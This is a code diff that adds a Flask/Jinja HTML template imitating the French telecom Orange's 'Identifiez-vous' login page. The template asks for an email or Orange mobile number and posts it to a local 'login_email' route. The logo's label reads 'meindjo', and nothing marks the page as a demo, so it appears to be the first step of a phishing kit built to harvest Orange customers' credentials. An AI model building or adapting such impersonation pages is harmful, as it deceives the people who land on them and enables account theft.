@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identifiez-vous - Orange</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <main class="main">
+        <div class="container">
+            <div class="logo" aria-label="meindjo">
+                <div class="logo-bar"></div>
+            </div>
+            <h1 class="title">Identifiez-vous</h1>
+
+            <form method="POST" action="{{ url_for('login_email') }}">
+                <p class="subtitle">Indiquez votre compte Orange</p>
+
+                <div class="field">
+                    <input type="email" name="email" placeholder="Adresse e-mail ou nº de mobile Orange" autofocus required>
+                    {% if error %}
+                        <p class="error">{{ error }}</p>
+                    {% endif %}
+                </div>
+
+                <div class="button-wrap">
+                    <button type="submit" class="btn">Continuer</button>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <ul>
+            <li><a href="#">Informations légales</a></li>
+            <li><a href="#">Plan de site</a></li>
+            <li><a href="#">Données personnelles</a></li>
+            <li><a href="#">Accessibilité : non conforme</a></li>
+            <li><a href="#">Tarifs et Contrats</a></li>
+            <li><a href="#">Politique des cookies</a></li>
+            <li><a href="#">Gestion cookies</a></li>
+            <li><a href="#">Livraisons</a></li>
+        </ul>
+    </footer>
+</body>
+</html>
